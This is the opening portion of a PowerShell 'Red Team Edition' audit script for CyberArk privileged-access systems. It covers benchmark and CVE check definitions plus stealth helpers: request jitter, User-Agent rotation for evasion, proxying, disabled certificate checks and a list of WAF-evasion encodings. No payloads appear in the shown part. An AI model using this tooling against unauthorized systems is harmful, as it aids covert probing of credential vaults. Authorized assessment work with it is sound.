<#
.SYNOPSIS
    CyberArk PAM Security Configuration Audit Script - Red Team Edition
.DESCRIPTION
    Comprehensive automated security audit for CyberArk Privileged Access Management platform.
    Designed for offensive security professionals, red teamers, and penetration testers.
    
    Includes:
    - CIS Benchmark compliance checks
    - Vendor Best Practice assessments
    - Blackbox security testing (exposed endpoints, information disclosure, etc.)
    - Network security analysis (port scanning, vault port security)
    - SSL/TLS cipher suite enumeration
    - CVE-specific vulnerability checks (CVE-2021-31796, CVE-2022-22536, CVE-2023-43903, etc.)
    - 2025 CVE coverage (CVE-2025-22270 through CVE-2025-49831)
    - API security testing (BOLA, injection, mass assignment)
    - Host security checks (Windows firewall, service accounts, credential caching)
    - Session security and header injection testing
    - Component version detection and vulnerability mapping
    
    New in v4.2 (Red Team Enhancements):
    - OPSEC/Stealth Mode with configurable delays and jitter
    - Proxy support for Burp Suite/ZAP integration
    - Timing attack detection (user enumeration, blind SQLi)
    - JWT/OAuth2 security testing (none algorithm, key confusion)
    - WebSocket endpoint discovery and CSWSH testing
    - WAF/IDS evasion testing (encoding bypasses, HPP, request smuggling)
    - Randomized User-Agent rotation
    - Secure credential handling with memory cleanup
    
    Generates comprehensive HTML, CSV, and JSON reports with risk scoring.
.PARAMETER PVWA
    The URL of the PVWA server (e.g., https://pvwa.domain.com)
.PARAMETER AuthType
    Authentication method: CyberArk, LDAP, RADIUS, or SAML
.PARAMETER OutputPath
    Directory for report output (default: current directory)
.PARAMETER Credential
    PSCredential object (will prompt if not provided)
.PARAMETER SkipPortScan
    Skip network port scanning (faster execution)
.PARAMETER SkipHostChecks
    Skip local host security checks (Windows Firewall, services, etc.)
.PARAMETER SkipCVEChecks
    Skip CVE-specific vulnerability testing
.PARAMETER SkipAPITests
    Skip API security testing (BOLA, injection, etc.)
.PARAMETER SkipAuthenticatedChecks
    Skip all checks that require CyberArk API authentication
.PARAMETER UnauthenticatedOnly
    Run only unauthenticated (blackbox) checks - no credentials required
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -AuthType LDAP
    # Full audit with LDAP authentication
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -UnauthenticatedOnly
    # Blackbox-only audit - no credentials needed
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -SkipPortScan -SkipHostChecks
    # Full audit but skip port scanning and host checks
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -OPSECMode -UnauthenticatedOnly
    # Stealth scan with delays and reduced noise - ideal for red team ops
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -Proxy "http://127.0.0.1:8080" -IgnoreCertificateErrors
    # Route all traffic through Burp Suite proxy
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -IncludeTimingAttacks -IncludeJWTTests -IncludeWebSocketTests
    # Include advanced red team security tests
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -RequestDelay 3 -Jitter 30 -RandomizeUserAgent
    # Custom timing controls: 3 second delay with 30% jitter and randomized User-Agent
.EXAMPLE
    .\CyberArk-Security-Audit.ps1 -PVWA "https://pvwa.domain.com" -IncludeWAFEvasion -UnauthenticatedOnly
    # Test WAF bypass techniques during external pentest
.NOTES
    Version: 4.2
    Requires: PowerShell 5.1+, CyberArk REST API v12+
    Author: Security Assessment Team
    CIS Benchmark Reference: CIS CyberArk PAM Benchmark v1.0
    Vendor Reference: CyberArk Security Hardening Guide, CyberArk Best Practices
    
    Security Check Categories:
    - CIS Controls (1.x - 8.x): CIS Benchmark compliance
    - Vendor Controls (V1.x - V8.x): CyberArk best practices
    - Blackbox Controls (BB1 - BB11): External security testing
    - Network Controls (NET1 - NET7): Network security analysis
    - TLS Controls (TLS1 - TLS4): SSL/TLS configuration
    - CVE Controls (CVE1 - CVE15): Known vulnerability checks (2021-2025)
    - CA Controls (CA25-x): CyberArk security bulletin checks
    - Machine Identity (MID1 - MID9): Service account, AppID, and AIM Provider security
    - Secrets Management (SEC1 - SEC14): Credential Provider and Conjur security
    - Zero Standing Privileges (ZSP1 - ZSP5): JIT access assessment
    - Identity Governance (IGA1 - IGA8): Lifecycle and permission management
    - EPM Controls (EPM1 - EPM6): Endpoint Privilege Manager integration
    - Cloud Security (CLD1 - CLD6): Secure Cloud Access checks
    - Disaster Recovery (DR1 - DR5): HA and DR configuration
    - Compliance Mapping (COMP1 - COMP4): NIST, SOC2, PCI-DSS alignment
    - Audit Logging (AUD1 - AUD4): SIEM and logging validation
    - API Controls (API1 - API5): API security testing
    - Host Controls (HOST1 - HOST5): Windows host security
    
    CyberArk Tools Integration (v4.1):
    - AD Security (AD1 - AD7): Shadow admins, Skeleton Key, SID History, SPNs, Kerberos delegation (zBang-inspired)
    - Server Hardening (HARD1 - HARD8): Server roles, audit policy, RDP, registry, filesystem (CYBRHardeningCheck-inspired)
    - Vault Hardening (VAULT1 - VAULT6): NIC, static IP, domain membership, firewall, certificates
    - PSM Hardening (PSMH1 - PSMH10): AppLocker, RDP users, drives, RDS, SMB
    - PVWA Hardening (PVWAH1 - PVWAH8): WebDAV, IIS, app pool, MIME types
    - CPM Hardening (CPMH1 - CPMH4): FIPS, DEP, credential files, services
    - Application Control (APPCTL1 - APPCTL5): DLL injection/hijacking, AppLocker bypasses (Evasor-inspired)
    
    Red Team Enhancements (v4.2):
    - OPSEC Mode: Stealth scanning with delays, jitter, and reduced noise
    - Proxy Support: Route all traffic through Burp Suite, ZAP, or other proxies
    - Timing Attacks: Detect user enumeration and blind injection vulnerabilities
    - JWT Testing: Algorithm confusion, none bypass, key validation
    - WebSocket Testing: Endpoint discovery, CSWSH detection
    - WAF Evasion: Encoding bypasses, HPP, request smuggling indicators
    - User-Agent Rotation: Randomized or custom User-Agent strings
    - Quiet Mode: Reduced console output for automation
    
    WARNING: Some tests (port scanning, CVE checks, WAF evasion) may trigger security alerts.
    Always obtain proper authorization before running this script.
    
    Use -OPSECMode for reduced detection footprint during red team operations.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateScript({
        if ($_ -match '^https?://[a-zA-Z0-9]') { $true }
        else { throw "PVWA must be a valid URL starting with http:// or https://" }
    })]
    [string]$PVWA,

    [Parameter(Mandatory = $false)]
    [ValidateSet("CyberArk", "LDAP", "RADIUS", "SAML")]
    [string]$AuthType = "CyberArk",

    [Parameter(Mandatory = $false)]
    [string]$OutputPath = $PWD,

    [Parameter(Mandatory = $false)]
    [PSCredential]$Credential,

    [Parameter(Mandatory = $false)]
    [switch]$SkipPortScan,

    [Parameter(Mandatory = $false)]
    [switch]$SkipHostChecks,

    [Parameter(Mandatory = $false)]
    [switch]$SkipCVEChecks,

    [Parameter(Mandatory = $false)]
    [switch]$SkipAPITests,

    [Parameter(Mandatory = $false)]
    [switch]$SkipAuthenticatedChecks,

    [Parameter(Mandatory = $false)]
    [switch]$UnauthenticatedOnly,

    [Parameter(Mandatory = $false)]
    [int]$PortScanTimeout = 1000,

    [Parameter(Mandatory = $false)]
    [switch]$VerboseOutput,

    # New v4.0 parameters
    [Parameter(Mandatory = $false)]
    [switch]$SkipSecretsChecks,

    [Parameter(Mandatory = $false)]
    [switch]$SkipMachineIdentity,

    [Parameter(Mandatory = $false)]
    [switch]$SkipIGAChecks,

    [Parameter(Mandatory = $false)]
    [switch]$SkipCloudChecks,

    [Parameter(Mandatory = $false)]
    [switch]$SkipDRChecks,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeEPMChecks,

    [Parameter(Mandatory = $false)]
    [string]$EPMUrl,

    [Parameter(Mandatory = $false)]
    [switch]$ComplianceMapping,

    # New v4.1 parameters - Enhanced security checks from CyberArk tools
    [Parameter(Mandatory = $false)]
    [switch]$IncludeADChecks,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeAppControlChecks,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeConjurChecks,

    [Parameter(Mandatory = $false)]
    [string]$ConjurUrl,

    [Parameter(Mandatory = $false)]
    [string]$DomainController,

    [Parameter(Mandatory = $false)]
    [switch]$SkipHardeningChecks,

    # New v4.2 parameters - Red Team / Offensive Security Enhancements
    [Parameter(Mandatory = $false)]
    [Alias("Stealth")]
    [switch]$OPSECMode,

    [Parameter(Mandatory = $false)]
    [string]$Proxy,

    [Parameter(Mandatory = $false)]
    [PSCredential]$ProxyCredential,

    [Parameter(Mandatory = $false)]
    [switch]$IgnoreCertificateErrors,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 60)]
    [int]$RequestDelay = 0,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 100)]
    [int]$Jitter = 0,

    [Parameter(Mandatory = $false)]
    [string]$UserAgent,

    [Parameter(Mandatory = $false)]
    [switch]$RandomizeUserAgent,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeTimingAttacks,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeJWTTests,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeWebSocketTests,

    [Parameter(Mandatory = $false)]
    [switch]$IncludeWAFEvasion,

    [Parameter(Mandatory = $false)]
    [switch]$ParallelExecution,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 20)]
    [int]$MaxThreads = 5,

    [Parameter(Mandatory = $false)]
    [switch]$NoLogo,

    [Parameter(Mandatory = $false)]
    [switch]$QuietMode
)

#region Configuration
$script:Config = @{
    # CIS Benchmark thresholds
    MinPasswordLength = 14
    MaxPasswordAgeDays = 90
    MinVersionRetention = 5
    SessionTimeoutMinutes = 20
    MaxFailedLogins = 5
    MinTLSVersion = "1.2"

    # CyberArk Vendor Best Practice thresholds
    MinValidityPeriod = 60                    # Minutes - minimum time password must be valid
    MaxExclusiveAccessDuration = 1440         # Minutes (24 hours max for exclusive access)
    MaxPendingAccountAgeDays = 30             # Days before pending accounts should be reviewed
    MinReconcileFrequencyDays = 7             # Days between reconciliation checks
    MaxInactiveAccountDays = 90               # Days of inactivity before flagging
    RequireDualControlForSensitive = $true    # Require dual control for sensitive safes
    PSMRecordingRequired = $true              # Require PSM recording

    # API settings
    PageLimit = 1000
    TimeoutSeconds = 30

    # Network Security settings
    PortScanTimeoutMs = 1000                  # Timeout for port scan connections
    EnableAggressiveScanning = $false          # Enable more thorough but slower scanning

    # CVE Check settings
    CheckLog4Shell = $true                    # Include Log4Shell check (requires callback server)
    SSRFDelayThresholdMs = 5000               # Delay threshold indicating potential SSRF

    # Host Security settings
    MinSecurityLogSizeMB = 1024               # Minimum security log size in MB
    MaxCachedLogons = 0                       # Recommended cached logons (0 for servers)
    RequireLSAProtection = $true              # Require LSA Protection (RunAsPPL)

    # Vulnerability thresholds
    CertificateExpiryWarningDays = 30         # Warn if cert expires within this many days
    SignatureAgeWarningDays = 7               # Warn if AV signatures older than this

    # Known vulnerable CyberArk versions (major.minor)
    VulnerableVersions = @{
        "10.9"  = @("CVE-2021-31796")
        "10.10" = @("CVE-2021-31796", "CVE-2021-44228")
        "11.0"  = @("CVE-2021-44228")
        "11.1"  = @("CVE-2022-22536")
        "11.2"  = @("CVE-2022-22536")
        "12.0"  = @("CVE-2023-43903")
        "12.1"  = @("CVE-2023-43903")
        "12.2"  = @("CVE-2024-42339", "CVE-2024-42340")
        "14.0"  = @("CVE-2025-49827", "CVE-2025-49828", "CVE-2025-49829", "CVE-2025-49830", "CVE-2025-49831", "CA25-32")
        "14.2"  = @("CVE-2024-38996", "CA25-34", "CA25-35")
        "24.7"  = @("CVE-2025-22270", "CVE-2025-22271", "CVE-2025-22272", "CVE-2025-22273", "CVE-2025-22274")  # EPM SaaS
    }

    # Machine Identity Security thresholds
    MaxServiceAccountSafeMemberships = 10     # Maximum safes a service account should access
    MaxStaleIdentityDays = 180                # Days without activity for machine identity
    RequireAppIDAuthentication = $true        # Require strong AppID authentication

    # Identity Governance thresholds
    MaxUserSafeMemberships = 20               # Maximum safes a user should have access to
    MaxInactiveUserDays = 90                  # Days before flagging inactive users
    MaxPendingApprovalDays = 7                # Maximum days for pending approval requests
    MaxPermissionDriftPercentage = 20         # Percentage of unused permissions to flag

    # Zero Standing Privileges thresholds
    MaxStandingPrivilegeHours = 8             # Maximum hours for standing privilege access
    RequireJITForAdminAccounts = $true        # Require JIT for admin accounts

    # Secrets Management thresholds
    MaxSecretAgeDays = 365                    # Maximum age for secrets before rotation
    RequireAllowedMachines = $true            # Require allowed machines for AppIDs
    MinAppIDAuthMethods = 2                   # Minimum authentication methods for AppIDs

    # Cloud Security thresholds
    MaxCloudEntitlementScore = 50             # Maximum CIEM entitlement score
    RequireFederatedAuth = $true              # Require federated authentication for cloud

    # Disaster Recovery thresholds
    MaxReplicationLagMinutes = 15             # Maximum DR replication lag
    RequireBreakGlassAccounts = $true         # Require break-glass accounts configured

    # Active Directory Security thresholds (zBang-inspired)
    MaxDelegatedAccounts = 10                 # Maximum accounts with delegation
    MaxShadowAdminPercentage = 5              # Maximum % of shadow admins
    SPNPrivilegedAccountLimit = 0             # Privileged accounts with SPNs should be 0
    SIDHistoryAgeThresholdDays = 365          # SID History older than this is suspicious
    MaxUnconstrainedDelegation = 0            # Unconstrained delegation accounts (should be 0)

    # Server Hardening thresholds (CYBRHardeningCheck-inspired)
    RequireStaticIP = $true                   # Vault should use static IP
    RequireNonDomainJoined = $true            # Vault should not be domain-joined
    RequireFIPS = $false                      # FIPS mode requirement
    MinRDPEncryptionLevel = 3                 # Minimum RDP encryption level (High)
    RequireNLA = $true                        # Require Network Level Authentication

    # Application Control thresholds (Evasor-inspired)
    CheckDLLInjection = $true                 # Check for DLL injection vulnerabilities
    CheckDLLHijacking = $true                 # Check for DLL hijacking risks
    MaxWritableSystemPaths = 0                # Writable paths in system directories

    # Conjur/Secrets Manager thresholds
    MaxConjurAPIKeyAgeDays = 90               # Maximum age for Conjur API keys
    RequireConjurMTLS = $true                 # Require mTLS for Conjur

    # Red Team / OPSEC Configuration
    UserAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
        "CyberArk Password Vault Web Access"
        "Microsoft-CryptoAPI/10.0"
    )

    # Timing attack thresholds
    TimingAttackIterations = 10               # Number of iterations for timing analysis
    TimingVarianceThresholdMs = 50            # Variance threshold indicating potential timing leak
    BlindSQLDelaySeconds = 5                  # Delay for blind SQL injection tests

    # WAF Evasion payloads
    WAFEvasionEncodings = @("UrlEncode", "DoubleUrlEncode", "UnicodeEncode", "Base64", "HexEncode")
}

# CIS Benchmark Control Mappings
$script:CISControls = @{
    "1.1" = "Ensure dedicated server for Vault"
    "1.2" = "Ensure Vault firewall rules configured"
    "1.3" = "Ensure unnecessary services disabled"
    "2.1" = "Ensure strong Master Policy password settings"
    "2.2" = "Ensure password complexity requirements"
    "2.3" = "Ensure minimum password length"
    "2.4" = "Ensure password expiration policy"
    "3.1" = "Ensure safe access follows least privilege"
    "3.2" = "Ensure safe member permissions reviewed"
    "3.3" = "Ensure dual control for sensitive safes"
    "4.1" = "Ensure automatic password management enabled"
    "4.2" = "Ensure password rotation schedule"
    "4.3" = "Ensure reconciliation accounts configured"
    "5.1" = "Ensure MFA enabled for authentication"
    "5.2" = "Ensure LDAP uses secure connection"
    "5.3" = "Ensure session timeout configured"
    "6.1" = "Ensure PSM session recording enabled"
    "6.2" = "Ensure PSM isolation configured"
    "7.1" = "Ensure audit logging enabled"
    "7.2" = "Ensure SIEM integration configured"
    "7.3" = "Ensure component monitoring active"
    "8.1" = "Ensure TLS 1.2+ enforced"
    "8.2" = "Ensure secure cipher suites"
    "8.3" = "Ensure certificates valid"
    # Vendor Best Practice Controls (V prefix)
    "V1.1" = "Master Policy - Minimum validity period"
    "V1.2" = "Master Policy - One-time password enforcement"
    "V1.3" = "Master Policy - Exclusive access controls"
    "V1.4" = "Master Policy - Reset overrides settings"
    "V2.1" = "PSM - Session recording enabled"
    "V2.2" = "PSM - Keystroke logging configured"
    "V2.3" = "PSM - Copy/paste restrictions"
    "V2.4" = "PSM - Recording encryption"
    "V3.1" = "Account Discovery - Pending accounts reviewed"
    "V3.2" = "Account Discovery - Onboarding rules defined"
    "V3.3" = "Account Discovery - Scanner configuration"
    "V4.1" = "PTA - Anomaly detection enabled"
    "V4.2" = "PTA - Unmanaged account detection"
    "V4.3" = "PTA - SIEM integration active"
    "V5.1" = "Connection Components - Security configured"
    "V5.2" = "Connection Components - Transparent users"
    "V6.1" = "Linked Accounts - Logon accounts configured"
    "V6.2" = "Linked Accounts - Reconcile accounts assigned"
    "V7.1" = "PVWA - HTTP security headers"
    "V7.2" = "PVWA - Session management"
    "V7.3" = "PVWA - Concurrent session limits"
    "V8.1" = "CPM - Service account permissions"
    "V8.2" = "CPM - Scanner intervals"
    # Blackbox Security Controls (BB prefix)
    "BB1" = "Exposed sensitive endpoints"
    "BB2" = "Information disclosure"
    "BB3" = "Default credentials"
    "BB4" = "Dangerous HTTP methods"
    "BB5" = "Cookie security attributes"
    "BB6" = "CORS configuration"
    "BB7" = "Exposed backup/config files"
    "BB8" = "Directory listing"
    "BB9" = "SSL/TLS certificate issues"
    "BB10" = "Rate limiting"
    "BB11" = "Known vulnerabilities"
    # Network Security Controls (NET prefix)
    "NET1" = "CyberArk port exposure"
    "NET2" = "Vault port security (1858)"
    "NET3" = "Administrative port exposure"
    "NET4" = "SMB/NetBIOS exposure"
    "NET5" = "RDP exposure"
    "NET6" = "Database port exposure"
    "NET7" = "DNS security"
    # Advanced TLS Controls (TLS prefix)
    "TLS1" = "Cipher suite strength"
    "TLS2" = "Protocol version support"
    "TLS3" = "Certificate chain validation"
    "TLS4" = "OCSP/CRL checking"
    # CVE-Specific Controls (CVE prefix)
    "CVE1" = "CVE-2021-31796 (SSRF)"
    "CVE2" = "CVE-2022-22536 (Authentication Bypass)"
    "CVE3" = "CVE-2023-43903 (XSS)"
    "CVE4" = "CVE-2022-22965 (Spring4Shell)"
    "CVE5" = "CVE-2024-42340 (DOM XSS)"
    "CVE6" = "CVE-2024-42339 (HTML Injection)"
    "CVE7" = "CVE-2025-22270 (EPM HTML Injection)"
    "CVE8" = "CVE-2025-22271 (EPM X-Forwarded-For Spoofing)"
    "CVE9" = "CVE-2025-22272 (EPM XSS modalDlgMsgInternal)"
    "CVE10" = "CVE-2025-22273 (EPM Password Change Brute Force)"
    "CVE11" = "CVE-2025-22274 (EPM Application Definition Injection)"
    "CVE12" = "CVE-2025-49827 (Secrets Manager IAM Bypass)"
    "CVE13" = "CVE-2025-49828 (Secrets Manager RCE)"
    "CVE14" = "CVE-2025-49831 (Secrets Manager Network Bypass)"
    "CVE15" = "CVE-2024-38996 (PVWA Prototype Pollution)"
    # Security Bulletin Controls (CA prefix)
    "CA25-25" = "Secrets Manager SaaS Edge DoS"
    "CA25-29" = "PVWA Prototype Pollution"
    "CA25-32" = "CCP Sensitive Info Disclosure"
    "CA25-34" = "HTML5 Gateway DoS"
    "CA25-35" = "PSM-SSH Race Condition DoS"
    # API Security Controls (API prefix)
    "API1" = "API authentication bypass"
    "API2" = "Injection vulnerabilities"
    "API3" = "Broken object level authorization"
    "API4" = "Mass assignment"
    "API5" = "API versioning security"
    # Host Security Controls (HOST prefix)
    "HOST1" = "Windows firewall configuration"
    "HOST2" = "Service account privileges"
    "HOST3" = "Credential caching"
    "HOST4" = "Event log configuration"
    "HOST5" = "Antivirus/EDR status"
    # Machine Identity Security Controls (MID prefix)
    "MID1" = "Service account enumeration"
    "MID2" = "Machine identity rotation"
    "MID3" = "Over-privileged service accounts"
    "MID4" = "Certificate-based authentication"
    "MID5" = "AppID security validation"
    "MID6" = "Stale machine identities"
    # Secrets Management Controls (SEC prefix)
    "SEC1" = "Credential Provider deployment"
    "SEC2" = "AppID authentication strength"
    "SEC3" = "Allowed machines configuration"
    "SEC4" = "Cache TTL settings"
    "SEC5" = "CCP TLS/mTLS configuration"
    "SEC6" = "Secret rotation policy"
    "SEC7" = "Orphan secrets detection"
    "SEC8" = "Credential sprawl analysis"
    # Zero Standing Privileges Controls (ZSP prefix)
    "ZSP1" = "Permanent privileged access"
    "ZSP2" = "Dual control workflows"
    "ZSP3" = "Concurrent session limits"
    "ZSP4" = "Check-in/check-out enforcement"
    "ZSP5" = "Standing privilege recommendations"
    # Identity Governance Controls (IGA prefix)
    "IGA1" = "Orphaned identities"
    "IGA2" = "Permission drift detection"
    "IGA3" = "Inactive user accounts"
    "IGA4" = "Excessive safe memberships"
    "IGA5" = "Access certification status"
    "IGA6" = "Role membership sprawl"
    "IGA7" = "Pending account queue age"
    "IGA8" = "Account ownership gaps"
    # Endpoint Privilege Manager Controls (EPM prefix)
    "EPM1" = "EPM integration status"
    "EPM2" = "Default policy assessment"
    "EPM3" = "Application control mode"
    "EPM4" = "Credential theft protection"
    "EPM5" = "Elevation justification"
    "EPM6" = "EPM audit logging"
    # Cloud Security Controls (CLD prefix)
    "CLD1" = "Cloud provider integration"
    "CLD2" = "Federated identity configuration"
    "CLD3" = "Cloud secret sync policy"
    "CLD4" = "CIEM integration"
    "CLD5" = "Cloud IAM role analysis"
    "CLD6" = "Multi-cloud policy consistency"
    # Disaster Recovery Controls (DR prefix)
    "DR1" = "DR Vault replication"
    "DR2" = "HA cluster health"
    "DR3" = "Component redundancy"
    "DR4" = "Backup configuration"
    "DR5" = "Break-glass accounts"
    # Compliance Mapping Controls (COMP prefix)
    "COMP1" = "NIST CSF mapping"
    "COMP2" = "SOC 2 alignment"
    "COMP3" = "PCI-DSS controls"
    "COMP4" = "Blueprint maturity score"
    # Audit Logging Controls (AUD prefix)
    "AUD1" = "SIEM integration health"
    "AUD2" = "Audit log retention"
    "AUD3" = "Critical event alerting"
    "AUD4" = "Audit data integrity"
    # Active Directory Security Controls (AD prefix) - zBang-inspired
    "AD1" = "Shadow admin discovery"
    "AD2" = "Skeleton Key detection"
    "AD3" = "SID History analysis"
    "AD4" = "Risky SPN configuration"
    "AD5" = "Unconstrained delegation"
    "AD6" = "Constrained delegation with protocol transition"
    "AD7" = "Delegation privilege audit"
    # Server Hardening Controls (HARD prefix) - CYBRHardeningCheck-inspired
    "HARD1" = "Unnecessary server roles"
    "HARD2" = "Screen saver configuration"
    "HARD3" = "Advanced audit policy"
    "HARD4" = "Remote Desktop hardening"
    "HARD5" = "Registry permissions"
    "HARD6" = "Registry auditing"
    "HARD7" = "File system permissions"
    "HARD8" = "File system auditing"
    # Vault Hardening Controls (VAULT prefix)
    "VAULT1" = "NIC hardening"
    "VAULT2" = "Static IP configuration"
    "VAULT3" = "Domain membership check"
    "VAULT4" = "Logic Container service user"
    "VAULT5" = "Firewall non-standard rules"
    "VAULT6" = "Vault server certificate"
    # CPM Hardening Controls (CPMH prefix)
    "CPMH1" = "FIPS cryptography"
    "CPMH2" = "DEP configuration"
    "CPMH3" = "Credential file hardening"
    "CPMH4" = "CPM service account configuration"
    # PVWA Hardening Controls (PVWAH prefix)
    "PVWAH1" = "IIS registry shares"
    "PVWAH2" = "WebDAV disabled"
    "PVWAH3" = "PVWA cryptography settings"
    "PVWAH4" = "IIS MIME types"
    "PVWAH5" = "Anonymous authentication disabled"
    "PVWAH6" = "Application pool configuration"
    "PVWAH7" = "Non-system drive installation"
    "PVWAH8" = "Scheduled task service user"
    # PSM Hardening Controls (PSMH prefix)
    "PSMH1" = "PSM user configuration"
    "PSMH2" = "Remote Desktop Users cleared"
    "PSMH3" = "AppLocker rules"
    "PSMH4" = "PSM drives hidden"
    "PSMH5" = "IE tools blocked"
    "PSMH6" = "RDS hardening"
    "PSMH7" = "PSM user access hardening"
    "PSMH8" = "SMB services hardening"
    "PSMH9" = "Screen saver for PSM users"
    "PSMH10" = "Out-of-domain configuration"
    # Application Control Controls (APPCTL prefix) - Evasor-inspired
    "APPCTL1" = "DLL injection vulnerability"
    "APPCTL2" = "DLL hijacking risk"
    "APPCTL3" = "Resource hijacking"
    "APPCTL4" = "AppLocker bypass paths"
    "APPCTL5" = "Writable system paths"
    # Enhanced Secrets Management Controls (SEC prefix)
    "SEC9" = "Conjur integration health"
    "SEC10" = "MAML policy validation"
    "SEC11" = "Authenticator configuration"
    "SEC12" = "Conjur database encryption"
    "SEC13" = "API key rotation"
    "SEC14" = "Conjur audit logging"
    # Enhanced Machine Identity Controls (MID prefix)
    "MID7" = "AIM Provider deployment"
    "MID8" = "AIM Provider configuration"
    "MID9" = "AIM Provider connectivity"
}
#endregion

#region Helper Functions

#======================================================================
# UTILITY HELPER FUNCTIONS
#======================================================================

function Write-VerboseError {
    <#
    .SYNOPSIS
        Logs error details when VerboseOutput is enabled
    #>
    param(
        [string]$Context,
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )
    
    if ($VerboseOutput) {
        Write-AuditLog "TRACE [$Context]: $($ErrorRecord.Exception.Message)" -Level Warning
    }
}

function Test-Prerequisites {
    <#
    .SYNOPSIS
        Validates that required PowerShell modules and features are available
    #>
    Write-AuditLog "Checking prerequisites..." -Level Info
    
    $warnings = @()
    
    # Check PowerShell version
    if ($PSVersionTable.PSVersion.Major -lt 5) {
        $warnings += "PowerShell 5.1+ recommended. Current version: $($PSVersionTable.PSVersion)"
    }
    
    # Check for required modules (optional - will skip related checks if not available)
    $optionalModules = @(
        @{ Name = "NetSecurity"; Checks = "Windows Firewall checks" },
        @{ Name = "ActiveDirectory"; Checks = "AD security checks (zBang-style)" }
    )
    
    foreach ($module in $optionalModules) {
        if (-not (Get-Module -ListAvailable -Name $module.Name -ErrorAction SilentlyContinue)) {
            $warnings += "Module '$($module.Name)' not available - $($module.Checks) may be skipped"
        }
    }
    
    # Check for .NET classes needed for some tests
    try {
        [void][System.Net.Sockets.TcpClient]
    }
    catch {
        $warnings += ".NET TcpClient class not available - port scanning will be limited"
    }
    
    # Check TLS support
    $tlsProtocols = [Net.ServicePointManager]::SecurityProtocol
    if ($tlsProtocols -notmatch "Tls12|Tls13") {
        $warnings += "TLS 1.2/1.3 not enabled by default in this PowerShell session"
    }
    
    # Check if running as admin (needed for some host checks)
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin -and -not $SkipHostChecks) {
        $warnings += "Not running as Administrator - some host security checks may fail"
    }
    
    # Output warnings
    if ($warnings.Count -gt 0) {
        Write-AuditLog "Prerequisites check completed with $($warnings.Count) warning(s):" -Level Warning
        foreach ($warning in $warnings) {
            Write-AuditLog "  - $warning" -Level Warning
        }
    }
    else {
        Write-AuditLog "All prerequisites satisfied" -Level Success
    }
    
    return $warnings.Count -eq 0
}

#======================================================================
# OPSEC / RED TEAM HELPER FUNCTIONS
#======================================================================

function Initialize-OPSECMode {
    <#
    .SYNOPSIS
        Initializes OPSEC-safe defaults for red team operations
    #>
    Write-AuditLog "Initializing OPSEC Mode - Reducing detection footprint..." -Level Warning

    # Reduce aggressive testing
    $script:Config.PortScanTimeoutMs = 2000      # Slower scans
    $script:Config.EnableAggressiveScanning = $false

    # Disable noisy tests
    $script:SkipDefaultCredentialTests = $true
    $script:SkipRateLimitTests = $true
    $script:OPSECEnabled = $true

    # Add random delays between requests
    if ($script:RequestDelay -eq 0) {
        $script:RequestDelay = 2  # 2 second minimum delay
    }
    if ($script:Jitter -eq 0) {
        $script:Jitter = 30       # 30% jitter
    }
}

function Get-RandomizedUserAgent {
    <#
    .SYNOPSIS
        Returns a randomized User-Agent string for evasion
    #>
    if ($script:CustomUserAgent) {
        return $script:CustomUserAgent
    }

    if ($RandomizeUserAgent -or $OPSECMode) {
        $index = Get-Random -Minimum 0 -Maximum $script:Config.UserAgents.Count
        return $script:Config.UserAgents[$index]
    }

    return "CyberArk-Security-Audit/4.2"
}

function Add-RequestDelay {
    <#
    .SYNOPSIS
        Adds configurable delay with jitter between requests for OPSEC
    #>
    if ($script:RequestDelay -gt 0) {
        $baseDelay = $script:RequestDelay * 1000  # Convert to ms
        $jitterAmount = 0

        if ($script:Jitter -gt 0) {
            $jitterRange = [int]($baseDelay * ($script:Jitter / 100))
            $jitterAmount = Get-Random -Minimum (-$jitterRange) -Maximum $jitterRange
        }

        $actualDelay = [Math]::Max(100, $baseDelay + $jitterAmount)
        Start-Sleep -Milliseconds $actualDelay
    }
}

function Initialize-WebRequestDefaults {
    <#
    .SYNOPSIS
        Configures web request defaults including proxy and certificate handling
    #>

    # Configure TLS
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

    # Handle certificate errors if requested
    if ($IgnoreCertificateErrors) {
        Write-AuditLog "Certificate validation disabled - connections may be insecure" -Level Warning
        if ($PSVersionTable.PSVersion.Major -ge 6) {
            # PowerShell 6+ uses -SkipCertificateCheck parameter
            $script:SkipCertCheck = $true
        }
        else {
            # PowerShell 5.1 uses callback
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        }
    }

    # Configure proxy if specified
    if ($Proxy) {
        Write-AuditLog "Configuring proxy: $Proxy" -Level Info
        $script:WebProxy = New-Object System.Net.WebProxy($Proxy)
        $script:WebProxy.UseDefaultCredentials = $false

        if ($ProxyCredential) {
